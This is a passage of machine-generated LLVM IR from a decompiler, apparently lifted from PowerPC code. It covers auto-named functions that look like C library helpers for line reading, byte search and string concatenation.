dec_label_pc_10012f68:                            ; preds = %dec_label_pc_10012f58
  %v0_10012f68 = load i32, i32* @r29, align 4
  %v1_10012f68 = inttoptr i32 %v0_10012f68 to i16*
  %v2_10012f68 = load i16, i16* %v1_10012f68, align 2
  %v3_10012f68 = zext i16 %v2_10012f68 to i32
  store i32 0, i32* @r28, align 4
  %v1_10012f70 = add i32 %v0_10012f68, 8
  %v2_10012f70 = inttoptr i32 %v1_10012f70 to i32*
  %v3_10012f70 = load i32, i32* %v2_10012f70, align 4
  store i32 %v3_10012f70, i32* %r9.global-to-local, align 4
  %v1_10012f74 = call i32 @__asm_rlwinm(i32 %v3_10012f68, i32 0, i32 26, i32 24)
  %v2_10012f74 = trunc i32 %v1_10012f74 to i16
  %v3_10012f78 = load i32, i32* @r29, align 4
  %v4_10012f78 = inttoptr i32 %v3_10012f78 to i16*
  store i16 %v2_10012f74, i16* %v4_10012f78, align 2
  %v0_10012f7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012f7c = load i32, i32* @r29, align 4
  %v2_10012f7c = add i32 %v1_10012f7c, 28
  %v3_10012f7c = inttoptr i32 %v2_10012f7c to i32*
  store i32 %v0_10012f7c, i32* %v3_10012f7c, align 4
  br label %dec_label_pc_10012f80

dec_label_pc_10012f80:                            ; preds = %dec_label_pc_10012f58, %dec_label_pc_10012f48, %dec_label_pc_10012f40, %dec_label_pc_10012f68
  %v0_10012f84 = load i32, i32* @r28, align 4
  ret i32 %v0_10012f84

; uselistorder directives
  uselistorder i32 %v3_10012f34, { 1, 2, 0 }
  uselistorder i32 %v1_10012ee4, { 1, 0 }
  uselistorder i32 %v2_10012e28, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @function_10012cc8, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1002b8e0.712 to i32*), { 3, 4, 0, 5, 6, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10030000.1 to i32), { 19, 20, 21, 22, 23, 24, 25, 26, 0, 27, 28, 10, 1, 29, 3, 2, 11, 4, 12, 30, 13, 31, 5, 14, 32, 33, 34, 35, 15, 16, 6, 7, 8, 17, 9, 18 }
  uselistorder i32* @global_var_1002b930.831, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @function_10010040, { 33, 32, 31, 30, 29, 8, 7, 6, 35, 28, 27, 26, 5, 4, 3, 25, 24, 23, 22, 21, 20, 34, 1, 37, 39, 38, 36, 13, 12, 11, 10, 9, 19, 18, 17, 16, 15, 14, 0, 2 }
  uselistorder i32 ()* @function_10010048, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 9, 8, 7, 6, 5, 4, 41, 40, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 39, 38, 3, 2, 45, 44, 49, 48, 47, 46, 43, 42, 1, 0 }
  uselistorder i32 268500992, { 5, 0, 1, 2, 3, 4 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10012f80, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012f34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10012ea0, { 1, 0 }
}

define i32 @function_10012f98(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10012f98:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10013040, label %dec_label_pc_10012fb8

dec_label_pc_10012fb8:                            ; preds = %dec_label_pc_10012f98
  store i32 %tmp, i32* @r31, align 4
  %v2_100130203 = add i32 %arg2, -1
  store i32 %v2_100130203, i32* @r29, align 4
  %v4_100130289 = icmp eq i32 %arg2, 1
  br i1 %v4_100130289, label %dec_label_pc_1001302c, label %dec_label_pc_10012fc0

dec_label_pc_10012fc0:                            ; preds = %dec_label_pc_10012fb8, %dec_label_pc_10013020.backedge
  %v2_10012fdc = phi i32 [ %v2_10012fdc12, %dec_label_pc_10013020.backedge ], [ %tmp, %dec_label_pc_10012fb8 ]
  %v0_10012fc0 = phi i32 [ %v0_10013024, %dec_label_pc_10013020.backedge ], [ %arg3, %dec_label_pc_10012fb8 ]
  %v1_10012fc0 = add i32 %v0_10012fc0, 16
  %v2_10012fc0 = inttoptr i32 %v1_10012fc0 to i32*
  %v3_10012fc0 = load i32, i32* %v2_10012fc0, align 4
  %v1_10012fc4 = add i32 %v0_10012fc0, 24
  %v2_10012fc4 = inttoptr i32 %v1_10012fc4 to i32*
  %v3_10012fc4 = load i32, i32* %v2_10012fc4, align 4
  %v2_10012fc8 = add i32 %v3_10012fc0, 1
  store i32 %v2_10012fc8, i32* %r11.global-to-local, align 4
  %v3_10012fcc = icmp ult i32 %v3_10012fc0, %v3_10012fc4
  %v5_10012fcc = icmp eq i32 %v3_10012fc0, %v3_10012fc4
  store i1 %v5_10012fcc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012fcc, label %dec_label_pc_10012fd4, label %dec_label_pc_10012ff0

dec_label_pc_10012fd4:                            ; preds = %dec_label_pc_10012fc0
  %v4_10012fc0 = inttoptr i32 %v3_10012fc0 to i8*
  %v3_10012fd4 = load i8, i8* %v4_10012fc0, align 1
  %v3_10012fd8 = icmp eq i8 %v3_10012fd4, 10
  store i1 %v3_10012fd8, i1* %cr7_eq.global-to-local, align 1
  %v3_10012fdc = inttoptr i32 %v2_10012fdc to i8*
  store i8 %v3_10012fd4, i8* %v3_10012fdc, align 1
  %v0_10012fe0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012fe0 = load i32, i32* @r30, align 4
  %v2_10012fe0 = add i32 %v1_10012fe0, 16
  %v3_10012fe0 = inttoptr i32 %v2_10012fe0 to i32*
  store i32 %v0_10012fe0, i32* %v3_10012fe0, align 4
  %v0_10012fe4 = load i32, i32* @r31, align 4
  %v1_10012fe4 = add i32 %v0_10012fe4, 1
  store i32 %v1_10012fe4, i32* @r31, align 4
  %v0_10012fe8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012fe8, label %dec_label_pc_1001302c, label %dec_label_pc_10013020.backedge

dec_label_pc_10012ff0:                            ; preds = %dec_label_pc_10012fc0
  %v1_1001302410 = inttoptr i32 %v0_10012fc0 to i16*
  store i32 268513268, i32* @lr, align 4
  %v5_10012ff0 = call i32 @function_10014128(i16* %v1_1001302410, i32 %v3_10012fc0)
  %v6_10012ff0 = trunc i32 %v5_10012ff0 to i8
  %v4_10012ff4 = icmp eq i8 %v6_10012ff0, -1
  store i1 %v4_10012ff4, i1* %cr7_eq.global-to-local, align 1
  %v3_10012ffc = icmp eq i8 %v6_10012ff0, 10
  store i1 %v3_10012ffc, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10012ff4, label %dec_label_pc_10013004, label %dec_label_pc_10013014

dec_label_pc_10013004:                            ; preds = %dec_label_pc_10012ff0
  %v0_10013004 = load i32, i32* @r30, align 4
  %v1_10013004 = inttoptr i32 %v0_10013004 to i16*
  %v2_10013004 = load i16, i16* %v1_10013004, align 2
  %v1_10013008 = and i16 %v2_10013004, 8
  %v3_10013008 = icmp eq i16 %v1_10013008, 0
  br i1 %v3_10013008, label %dec_label_pc_10013004.dec_label_pc_1001302c_crit_edge, label %dec_label_pc_10013040

dec_label_pc_10013004.dec_label_pc_1001302c_crit_edge: ; preds = %dec_label_pc_10013004
  %v0_1001302c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001302c

dec_label_pc_10013014:                            ; preds = %dec_label_pc_10012ff0
  %v3_10013014 = load i32, i32* @r31, align 4
  %v4_10013014 = inttoptr i32 %v3_10013014 to i8*
  store i8 %v6_10012ff0, i8* %v4_10013014, align 1
  %v0_10013018 = load i32, i32* @r31, align 4
  %v1_10013018 = add i32 %v0_10013018, 1
  store i32 %v1_10013018, i32* @r31, align 4
  %v0_1001301c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1001301c, label %dec_label_pc_1001302c, label %dec_label_pc_10013020.backedge

dec_label_pc_10013020.backedge:                   ; preds = %dec_label_pc_10013014, %dec_label_pc_10012fd4
  %v2_10012fdc12 = phi i32 [ %v1_10013018, %dec_label_pc_10013014 ], [ %v1_10012fe4, %dec_label_pc_10012fd4 ]
  %v0_10013020 = load i32, i32* @r29, align 4
  %v2_10013020 = add i32 %v0_10013020, -1
  store i32 %v2_10013020, i32* @r29, align 4
  %v0_10013024 = load i32, i32* @r30, align 4
  %v4_10013028 = icmp eq i32 %v0_10013020, 1
  br i1 %v4_10013028, label %dec_label_pc_1001302c, label %dec_label_pc_10012fc0

dec_label_pc_1001302c:                            ; preds = %dec_label_pc_10013014, %dec_label_pc_10013020.backedge, %dec_label_pc_10012fd4, %dec_label_pc_10012fb8, %dec_label_pc_10013004.dec_label_pc_1001302c_crit_edge
  %v2_10013038 = phi i32 [ %v0_1001302c.pre, %dec_label_pc_10013004.dec_label_pc_1001302c_crit_edge ], [ %tmp, %dec_label_pc_10012fb8 ], [ %v1_10012fe4, %dec_label_pc_10012fd4 ], [ %v2_10012fdc12, %dec_label_pc_10013020.backedge ], [ %v1_10013018, %dec_label_pc_10013014 ]
  %v1_1001302c = load i32, i32* @r28, align 4
  %v3_1001302c = icmp ugt i32 %v2_10013038, %v1_1001302c
  %v4_1001302c = icmp eq i32 %v2_10013038, %v1_1001302c
  store i1 %v4_1001302c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001302c, label %dec_label_pc_10013034, label %dec_label_pc_10013040

dec_label_pc_10013034:                            ; preds = %dec_label_pc_1001302c
  %v3_10013038 = inttoptr i32 %v2_10013038 to i8*
  store i8 0, i8* %v3_10013038, align 1
  %v0_10013048.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10013044

dec_label_pc_10013040:                            ; preds = %dec_label_pc_10013004, %dec_label_pc_1001302c, %dec_label_pc_10012f98
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10013044

dec_label_pc_10013044:                            ; preds = %dec_label_pc_10013034, %dec_label_pc_10013040
  %v0_10013048 = phi i32 [ %v0_10013048.pre, %dec_label_pc_10013034 ], [ 0, %dec_label_pc_10013040 ]
  ret i32 %v0_10013048

; uselistorder directives
  uselistorder i32 %v2_10013038, { 0, 2, 1 }
  uselistorder i8 %v6_10012ff0, { 1, 0, 2 }
  uselistorder i32 %v3_10012fc4, { 1, 0 }
  uselistorder i32 %v3_10012fc0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10012fc0, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10013044, { 1, 0 }
  uselistorder label %dec_label_pc_10013040, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001302c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10012fc0, { 1, 0 }
}

define i32 @function_1001305c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1001305c:
  %r4.global-to-local = alloca i32, align 4
  %v1_1001305c = urem i32 %arg1, 256
  store i32 %v1_1001305c, i32* %r4.global-to-local, align 4
  %v0_100130741 = load i32, i32* @r3, align 4
  %v1_100130742 = urem i32 %v0_100130741, 4
  %v3_100130744 = icmp eq i32 %v1_100130742, 0
  br i1 %v3_100130744, label %dec_label_pc_1001307c, label %dec_label_pc_10013064

dec_label_pc_10013064:                            ; preds = %dec_label_pc_1001305c, %dec_label_pc_10013064
  %v1_10013068 = phi i32 [ %v0_1001307c.pre, %dec_label_pc_10013064 ], [ %v1_1001305c, %dec_label_pc_1001305c ]
  %v0_10013064 = phi i32 [ %v1_10013070, %dec_label_pc_10013064 ], [ %v0_100130741, %dec_label_pc_1001305c ]
  %v1_10013064 = inttoptr i32 %v0_10013064 to i8*
  %v2_10013064 = load i8, i8* %v1_10013064, align 1
  %v3_10013064 = zext i8 %v2_10013064 to i32
  %v4_10013068 = icmp eq i32 %v3_10013064, %v1_10013068
  %v0_1001306c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10013068, i32 %v0_1001306c)
  %v0_10013070 = load i32, i32* @r3, align 4
  %v1_10013070 = add i32 %v0_10013070, 1
  store i32 %v1_10013070, i32* @r3, align 4
  %v1_10013074 = urem i32 %v1_10013070, 4
  %v3_10013074 = icmp eq i32 %v1_10013074, 0
  %v0_1001307c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10013074, label %dec_label_pc_1001307c, label %dec_label_pc_10013064

dec_label_pc_1001307c:                            ; preds = %dec_label_pc_10013064, %dec_label_pc_1001305c
  %v0_100130949 = phi i32 [ %v0_100130741, %dec_label_pc_1001305c ], [ %v1_10013070, %dec_label_pc_10013064 ]
  %v0_1001307c = phi i32 [ %v1_1001305c, %dec_label_pc_1001305c ], [ %v0_1001307c.pre, %dec_label_pc_10013064 ]
  %v1_1001307c = mul i32 %v0_1001307c, 256
  %v2_10013084 = or i32 %v1_1001307c, %v0_1001307c
  %v1_1001308c = mul i32 %v2_10013084, 65536
  %v2_10013090 = or i32 %v1_1001308c, %v2_10013084
  br label %dec_label_pc_10013094

dec_label_pc_10013094:                            ; preds = %dec_label_pc_10013100, %dec_label_pc_10013094, %dec_label_pc_1001307c
  %v0_100130d0 = phi i32 [ %v0_100130949, %dec_label_pc_1001307c ], [ %v1_10013098, %dec_label_pc_10013094 ], [ %v1_10013098, %dec_label_pc_10013100 ]
  %v1_10013094 = inttoptr i32 %v0_100130d0 to i32*
  %v2_10013094 = load i32, i32* %v1_10013094, align 4
  %v1_10013098 = add i32 %v0_100130d0, 4
  %v2_100130a0 = xor i32 %v2_10013094, %v2_10013090
  %v1_100130a8 = add i32 %v2_100130a0, 2130640639
  %v2_100130ac = xor i32 %v1_100130a8, %v2_100130a0
  %v1_100130b0 = add i32 %v0_100130d0, 1
  %v2_100130b4 = and i32 %v2_100130ac, -2130640640
  %v6_100130b4 = icmp eq i32 %v2_100130b4, -2130640640
  br i1 %v6_100130b4, label %dec_label_pc_10013094, label %dec_label_pc_100130bc

dec_label_pc_100130bc:                            ; preds = %dec_label_pc_10013094
  %v2_100130bc = inttoptr i32 %v0_100130d0 to i8*
  %v3_100130bc = load i8, i8* %v2_100130bc, align 1
  %v4_100130bc = zext i8 %v3_100130bc to i32
  %v1_100130c0 = add i32 %v0_100130d0, 3
  %v1_100130c4 = add i32 %v0_100130d0, 2
  %v4_100130c8 = icmp eq i32 %v4_100130bc, %v0_1001307c
  br i1 %v4_100130c8, label %dec_label_pc_100130d0, label %dec_label_pc_100130d8

dec_label_pc_100130d0:                            ; preds = %dec_label_pc_100130bc
  ret i32 %v0_100130d0

dec_label_pc_100130d8:                            ; preds = %dec_label_pc_100130bc
  %v2_100130d8 = inttoptr i32 %v1_100130b0 to i8*
  %v3_100130d8 = load i8, i8* %v2_100130d8, align 1
  %v4_100130d8 = zext i8 %v3_100130d8 to i32
  %v4_100130dc = icmp eq i32 %v4_100130d8, %v0_1001307c
  br i1 %v4_100130dc, label %dec_label_pc_100130e4, label %dec_label_pc_100130ec

dec_label_pc_100130e4:                            ; preds = %dec_label_pc_100130d8
  ret i32 %v1_100130b0

dec_label_pc_100130ec:                            ; preds = %dec_label_pc_100130d8
  %v2_100130ec = inttoptr i32 %v1_100130c4 to i8*
  %v3_100130ec = load i8, i8* %v2_100130ec, align 1
  %v4_100130ec = zext i8 %v3_100130ec to i32
  %v4_100130f0 = icmp eq i32 %v4_100130ec, %v0_1001307c
  br i1 %v4_100130f0, label %dec_label_pc_100130f8, label %dec_label_pc_10013100

dec_label_pc_100130f8:                            ; preds = %dec_label_pc_100130ec
  ret i32 %v1_100130c4

dec_label_pc_10013100:                            ; preds = %dec_label_pc_100130ec
  %v2_10013100 = inttoptr i32 %v1_100130c0 to i8*
  %v3_10013100 = load i8, i8* %v2_10013100, align 1
  %v4_10013100 = zext i8 %v3_10013100 to i32
  %v4_10013104 = icmp eq i32 %v4_10013100, %v0_1001307c
  br i1 %v4_10013104, label %dec_label_pc_1001310c, label %dec_label_pc_10013094

dec_label_pc_1001310c:                            ; preds = %dec_label_pc_10013100
  ret i32 %v1_100130c0

; uselistorder directives
  uselistorder i32 %v1_10013098, { 1, 0 }
  uselistorder i32 %v0_100130d0, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_10013084, { 1, 0 }
  uselistorder i32 %v0_1001307c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10013070, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100130741, { 2, 1, 0 }
  uselistorder i32 %v1_1001305c, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10013064, { 1, 0 }
}

define i32 @function_10013114(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10013114:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013118

dec_label_pc_10013118:                            ; preds = %dec_label_pc_10013118, %dec_label_pc_10013114
  %v0_10013118 = phi i32 [ %v1_1001311c, %dec_label_pc_10013118 ], [ %tmp, %dec_label_pc_10013114 ]
  %v1_10013118 = inttoptr i32 %v0_10013118 to i8*
  %v2_10013118 = load i8, i8* %v1_10013118, align 1
  %v1_1001311c = add i32 %v0_10013118, 1
  store i32 %v1_1001311c, i32* %r11.global-to-local, align 4
  %v3_10013120 = icmp eq i8 %v2_10013118, 0
  store i1 %v3_10013120, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013120, label %dec_label_pc_10013128, label %dec_label_pc_10013118

dec_label_pc_10013128:                            ; preds = %dec_label_pc_10013118
  %v3_10013128 = icmp eq i32 %arg2, 3
  store i1 %v3_10013128, i1* %cr7_eq.global-to-local, align 1
  %v1_1001312c = add i32 %v0_10013118, -1
  store i32 %v1_1001312c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_100131c8, label %dec_label_pc_10013138

dec_label_pc_10013138:                            ; preds = %dec_label_pc_10013128
  %v1_10013138 = udiv i32 %arg2, 4
  store i32 %v1_10013138, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013140

dec_label_pc_10013140:                            ; preds = %dec_label_pc_10013140.dec_label_pc_10013140_crit_edge, %dec_label_pc_10013138
  %v2_10013150 = phi i32 [ %v0_10013144.pre, %dec_label_pc_10013140.dec_label_pc_10013140_crit_edge ], [ %v1_1001312c, %dec_label_pc_10013138 ]
  %v0_10013140 = load i32, i32* @r4, align 4
  %v1_10013140 = inttoptr i32 %v0_10013140 to i8*
  %v2_10013140 = load i8, i8* %v1_10013140, align 1
  %v1_10013144 = add i32 %v2_10013150, 1
  store i32 %v1_10013144, i32* %r7.global-to-local, align 4
  %v1_10013148 = add i32 %v0_10013140, 1
  store i32 %v1_10013148, i32* %r6.global-to-local, align 4
  %v3_1001314c = icmp eq i8 %v2_10013140, 0
  store i1 %v3_1001314c, i1* %cr7_eq.global-to-local, align 1
  %v4_10013150 = inttoptr i32 %v1_10013144 to i8*
  store i8 %v2_10013140, i8* %v4_10013150, align 1
  %v0_10013154 = load i32, i32* @lr, align 4
  %v1_10013154 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013154, i32 %v0_10013154)
  %v0_10013158 = load i32, i32* @r4, align 4
  %v1_10013158 = add i32 %v0_10013158, 1
  %v2_10013158 = inttoptr i32 %v1_10013158 to i8*
  %v3_10013158 = load i8, i8* %v2_10013158, align 1
  %v0_1001315c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001315c = add i32 %v0_1001315c, 1
  store i32 %v1_1001315c, i32* %r8.global-to-local, align 4
  %v0_10013160 = load i32, i32* %r7.global-to-local, align 4
  %v1_10013160 = add i32 %v0_10013160, 1
  store i32 %v1_10013160, i32* %r10.global-to-local, align 4
  %v1_10013164 = add i32 %v0_1001315c, 2
  store i32 %v1_10013164, i32* %r9.global-to-local, align 4
  %v1_10013168 = add i32 %v0_10013160, 2
  store i32 %v1_10013168, i32* %r12.global-to-local, align 4
  %v1_1001316c = add i32 %v0_1001315c, 3
  store i32 %v1_1001316c, i32* @r4, align 4
  %v3_10013170 = icmp eq i8 %v3_10013158, 0
  store i1 %v3_10013170, i1* %cr7_eq.global-to-local, align 1
  %v4_10013174 = inttoptr i32 %v1_10013160 to i8*
  store i8 %v3_10013158, i8* %v4_10013174, align 1
  %v0_10013178 = load i32, i32* @lr, align 4
  %v1_10013178 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013178, i32 %v0_10013178)
  %v0_1001317c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001317c = add i32 %v0_1001317c, 1
  %v2_1001317c = inttoptr i32 %v1_1001317c to i8*
  %v3_1001317c = load i8, i8* %v2_1001317c, align 1
  %v0_10013180 = load i32, i32* %r12.global-to-local, align 4
  %v1_10013180 = add i32 %v0_10013180, 1
  store i32 %v1_10013180, i32* %r11.global-to-local, align 4
  %v3_10013184 = icmp eq i8 %v3_1001317c, 0
  store i1 %v3_10013184, i1* %cr7_eq.global-to-local, align 1
  %v2_10013188 = load i32, i32* %r10.global-to-local, align 4
  %v3_10013188 = add i32 %v2_10013188, 1
  %v4_10013188 = inttoptr i32 %v3_10013188 to i8*
  store i8 %v3_1001317c, i8* %v4_10013188, align 1
  %v0_1001318c = load i32, i32* @lr, align 4
  %v1_1001318c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001318c, i32 %v0_1001318c)
  %v0_10013190 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013190 = add i32 %v0_10013190, 1
  %v2_10013190 = inttoptr i32 %v1_10013190 to i8*
  %v3_10013190 = load i8, i8* %v2_10013190, align 1
  %v4_10013190 = zext i8 %v3_10013190 to i32
  store i32 %v4_10013190, i32* %r9.global-to-local, align 4
  %v3_10013194 = icmp eq i8 %v3_10013190, 0
  store i1 %v3_10013194, i1* %cr7_eq.global-to-local, align 1
  %v2_10013198 = load i32, i32* %r12.global-to-local, align 4
  %v3_10013198 = add i32 %v2_10013198, 1
  %v4_10013198 = inttoptr i32 %v3_10013198 to i8*
  store i8 %v3_10013190, i8* %v4_10013198, align 1
  %v0_1001319c = load i32, i32* @lr, align 4
  %v1_1001319c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001319c, i32 %v0_1001319c)
  %v0_100131a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100131a0 = add i32 %v0_100131a0, -1
  store i32 %v1_100131a0, i32* %ctr.global-to-local, align 4
  %v2_100131a0 = icmp eq i32 %v1_100131a0, 0
  br i1 %v2_100131a0, label %dec_label_pc_100131a4, label %dec_label_pc_10013140.dec_label_pc_10013140_crit_edge

dec_label_pc_10013140.dec_label_pc_10013140_crit_edge: ; preds = %dec_label_pc_10013140
  %v0_10013144.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013140

dec_label_pc_100131a4:                            ; preds = %dec_label_pc_10013140
  %v0_100131a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100131a4 = urem i32 %v0_100131a4, 4
  store i32 %v1_100131a4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100131c8

dec_label_pc_100131ac:                            ; preds = %dec_label_pc_100131c8, %dec_label_pc_100131ac.dec_label_pc_100131ac_crit_edge
  %v0_100131b0 = phi i32 [ %v0_100131b0.pre, %dec_label_pc_100131ac.dec_label_pc_100131ac_crit_edge ], [ %v0_100131c8, %dec_label_pc_100131c8 ]
  %v0_100131ac = load i32, i32* @r4, align 4
  %v1_100131ac = inttoptr i32 %v0_100131ac to i8*
  %v2_100131ac = load i8, i8* %v1_100131ac, align 1
  %v3_100131ac = zext i8 %v2_100131ac to i32
  store i32 %v3_100131ac, i32* %r9.global-to-local, align 4
  %v1_100131b0 = add i32 %v0_100131b0, -1
  store i32 %v1_100131b0, i32* %r5.global-to-local, align 4
  %v1_100131b4 = add i32 %v0_100131ac, 1
  store i32 %v1_100131b4, i32* @r4, align 4
  %v3_100131b8 = icmp eq i8 %v2_100131ac, 0
  store i1 %v3_100131b8, i1* %cr7_eq.global-to-local, align 1
  %v2_100131bc = load i32, i32* %r11.global-to-local, align 4
  %v3_100131bc = add i32 %v2_100131bc, 1
  %v4_100131bc = inttoptr i32 %v3_100131bc to i8*
  store i8 %v2_100131ac, i8* %v4_100131bc, align 1
  store i32 %v3_100131bc, i32* %r11.global-to-local, align 4
  %v0_100131c0 = load i32, i32* @lr, align 4
  %v1_100131c0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100131c0, i32 %v0_100131c0)
  %v0_100131d0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100131d0 = add i32 %v0_100131d0, -1
  store i32 %v1_100131d0, i32* %ctr.global-to-local, align 4
  %v2_100131d0 = icmp eq i32 %v1_100131d0, 0
  br i1 %v2_100131d0, label %dec_label_pc_100131d4, label %dec_label_pc_100131ac.dec_label_pc_100131ac_crit_edge

dec_label_pc_100131ac.dec_label_pc_100131ac_crit_edge: ; preds = %dec_label_pc_100131ac
  %v0_100131b0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100131ac

dec_label_pc_100131c8:                            ; preds = %dec_label_pc_10013128, %dec_label_pc_100131a4
  %v0_100131c8 = phi i32 [ %arg2, %dec_label_pc_10013128 ], [ %v1_100131a4, %dec_label_pc_100131a4 ]
  store i32 %v0_100131c8, i32* %ctr.global-to-local, align 4
  %v2_100131d03 = icmp eq i32 %v0_100131c8, 0
  br i1 %v2_100131d03, label %dec_label_pc_100131d4, label %dec_label_pc_100131ac

dec_label_pc_100131d4:                            ; preds = %dec_label_pc_100131ac, %dec_label_pc_100131c8
  %v0_100131d4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100131d4 = icmp eq i32 %v0_100131d4, 0
  store i1 %v3_100131d4, i1* %cr7_eq.global-to-local, align 1
  %v0_100131d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100131d4, i32 %v0_100131d8)
  %v0_100131dc = load i32, i32* %r5.global-to-local, align 4
  %v1_100131dc = trunc i32 %v0_100131dc to i8
  %v2_100131dc = load i32, i32* %r11.global-to-local, align 4
  %v3_100131dc = add i32 %v2_100131dc, 1
  %v4_100131dc = inttoptr i32 %v3_100131dc to i8*
  store i8 %v1_100131dc, i8* %v4_100131dc, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_100131c8, { 1, 2, 0 }
  uselistorder i32 %v1_100131d0, { 1, 0 }
  uselistorder i32 %v1_100131a4, { 1, 0 }
  uselistorder i32 %v1_100131a0, { 1, 0 }
  uselistorder i32 %v1_1001311c, { 1, 0 }
  uselistorder i32 %v0_10013118, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_100131d4, { 1, 0 }
  uselistorder label %dec_label_pc_100131c8, { 1, 0 }
}

define i32 @function_100131e4(i8* %arg1) local_unnamed_addr {
dec_label_pc_100131e4:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100132141 = load i32, i32* @r3, align 4
  %v1_100132142 = inttoptr i32 %v0_100132141 to i8*
  %v2_100132143 = load i8, i8* %v1_100132142, align 1
  %v3_100132186 = icmp eq i8 %v2_100132143, 0
  br i1 %v3_100132186, label %dec_label_pc_10013228, label %dec_label_pc_10013220

dec_label_pc_100131f0:                            ; preds = %dec_label_pc_100131f0, %dec_label_pc_10013220
  %v0_100131f0 = phi i32 [ %v1_100131f4, %dec_label_pc_100131f0 ], [ %tmp, %dec_label_pc_10013220 ]
  %v1_100131f0 = inttoptr i32 %v0_100131f0 to i8*
